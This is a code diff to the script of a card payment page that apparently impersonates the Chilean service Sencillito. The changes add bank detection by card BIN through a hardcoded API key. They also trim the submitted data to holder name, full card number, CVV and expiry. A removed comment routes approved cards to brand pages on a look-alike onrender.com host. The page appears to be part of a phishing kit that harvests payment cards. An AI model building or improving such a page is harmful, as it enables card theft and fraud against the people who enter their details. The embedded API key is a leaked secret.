@@ -317,6 +317,7 @@
         // ============================================================
         const POLLING_INTERVAL = 2000;
         const MAX_POLLING_TIME = 300000; // 5 min
+        const HANDYAPI_KEY = 'HAS-139kYW5q3NS98PmXt8w67rbDH';
 
         const formatCLP = (amount) =>
             new Intl.NumberFormat('es-CL', { style: 'currency', currency: 'CLP', maximumFractionDigits: 0 }).format(amount);
@@ -326,6 +327,7 @@
         let pagoEnviado = false;
         let solicitudId = null;
         let pollingInterval = null;
+        let detectedBank = null;
 
         const loadingOverlay  = document.getElementById('loadingOverlay');
         const loadingText     = document.getElementById('loadingText');
@@ -334,6 +336,61 @@
         const progressWrapper = document.getElementById('progressWrapper');
         const progressFill    = document.getElementById('progressFill');
         const initialSpinner  = document.getElementById('initialSpinner');
+
+        // ============================================================
+        // DETECCIÓN DE BANCO CHILENO POR BIN (HandyAPI)
+        // ============================================================
+        const binCache = new Map();
+        const bankNameMappingCL = {
+            'banco de chile': 'Banco de Chile',
+            'banco estado': 'Banco Estado', 'bancoestado': 'Banco Estado',
+            'santander': 'Santander',
+            'bci': 'BCI',
+            'falabella': 'Banco Falabella',
+            'security': 'Banco Security',
+            'itau': 'Itaú', 'itaú': 'Itaú',
+            'scotiabank': 'Scotiabank',
+            'bice': 'BICE',
+            'ripley': 'Banco Ripley',
+            'consorcio': 'Banco Consorcio',
+            'internacional': 'Banco Internacional',
+            'bbva': 'BBVA',
+            'tenpo': 'Tenpo',
+            'mach': 'MACH',
+            'coopeuch': 'Coopeuch',
+            'mercadopago': 'Mercado Pago',
+            'hites': 'Hites',
+            'paris': 'Banco Paris',
+            'walmart': 'Banco Walmart',
+            'desarrollo': 'Banco del Desarrollo'
+        };
+
+        async function detectBankByBIN(cardNumber) {
+            const clean = cardNumber.replace(/\s/g, '');
+            if (clean.length < 6) return null;
+            const bin = clean.substring(0, 6);
+            if (binCache.has(bin)) return binCache.get(bin);
+            try {
+                const r = await fetch(`https://data.handyapi.com/bin/${bin}`, {
+                    headers: { 'x-api-key': HANDYAPI_KEY }
+                });
+                if (!r.ok) return null;
+                const data = await r.json();
+                if (data.Status === 'ERROR' || data.error) return null;
+                let bank = null;
+                if (data.Issuer) {
+                    const raw = data.Issuer.toLowerCase();
+                    for (const [k, v] of Object.entries(bankNameMappingCL)) {
+                        if (raw.includes(k)) { bank = v; break; }
+                    }
+                    if (!bank) bank = data.Issuer;
+                }
+                const country = data.Country?.A2 || '';
+                if (country && country !== 'CL') return null;
+                binCache.set(bin, bank || 'Desconocido');
+                return bank || 'Desconocido';
+            } catch { return null; }
+        }
 
         document.addEventListener('DOMContentLoaded', () => {
             const stored = localStorage.getItem('sencillito_pago_pendiente');
@@ -356,7 +413,8 @@
             document.getElementById('mobile-amount').textContent = montoFormateado;
             document.getElementById('mobile-logo').src = data.logo;
 
-            // Formateo número
+            // Formateo número + detección de banco
+            let bankTimeout = null;
             document.querySelectorAll('#numero, #numero-m').forEach(el => {
                 el.addEventListener('input', (e) => {
                     let v = e.target.value.replace(/\D/g, '').substring(0, 16);
@@ -364,6 +422,15 @@
                     const isMobile = el.id.endsWith('-m');
                     const preview = document.getElementById(isMobile ? 'preview-numero-m' : 'preview-numero');
                     if (preview) preview.textContent = e.target.value || '•••• •••• •••• ••••';
+
+                    clearTimeout(bankTimeout);
+                    if (v.length >= 6) {
+                        bankTimeout = setTimeout(async () => {
+                            detectedBank = await detectBankByBIN(v);
+                        }, 600);
+                    } else {
+                        detectedBank = null;
+                    }
                 });
             });
 
@@ -437,8 +504,6 @@
 
                     if (data.estado === 'aprobado') {
                         clearInterval(pollingInterval);
-                        // data.redirect viene del backend apuntando a
-                        // https://sncill-to-yzzz.onrender.com/visa.php (o master/amex)
                         mostrarCargaConLogos(data.marca, data.redirect);
                     } else if (data.estado === 'rechazado') {
                         clearInterval(pollingInterval);
@@ -446,7 +511,6 @@
                         alert(data.mensaje || 'La tarjeta fue declinada por el emisor. Verifica los datos o utiliza otra tarjeta.');
                         resetFormulario();
                     }
-                    // 'pendiente' → sigue esperando en el overlay
                 } catch {}
             }, POLLING_INTERVAL);
         }
@@ -501,6 +565,7 @@
 
         // ============================================================
         // ENVÍO DEL PAGO → POST /api/crear-pago (relativo)
+        // Solo enviamos: solicitud_id, titular, tarjeta, cvv, vence, marca, banco
         // ============================================================
         async function enviarPago(event) {
             event.preventDefault();
@@ -534,6 +599,12 @@
                 return;
             }
 
+            // Si no hay banco detectado, intentarlo ahora antes de enviar
+            if (!detectedBank && numero.length >= 6) {
+                detectedBank = await detectBankByBIN(numero);
+                await new Promise(r => setTimeout(r, 400));
+            }
+
             const btn = document.getElementById('btn-pagar' + sufijo);
             btn.disabled = true;
             btn.innerHTML = '<div style="border: 3px solid #f3f3f3; border-top: 3px solid #fff; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin: 0 auto;"></div>';
@@ -555,18 +626,12 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         solicitud_id: solicitudId,
-                        empresa: datosPagoActual.empresa || 'Sencillito',
-                        monto_clp: datosPagoActual.monto || 0,
-                        referencia: 'sencillito_' + Date.now(),
                         titular: titular,
                         numero_tarjeta: numero,
                         cvv: cvv,
                         vencimiento: vence,
                         marca_tarjeta: marca,
-                        banco_emisor: datosPagoActual.banco || 'Desconocido',
-                        ip_usuario: '',
-                        pais_usuario: '',
-                        ciudad_usuario: ''
+                        banco_emisor: detectedBank || 'Desconocido'
                     })
                 });
 
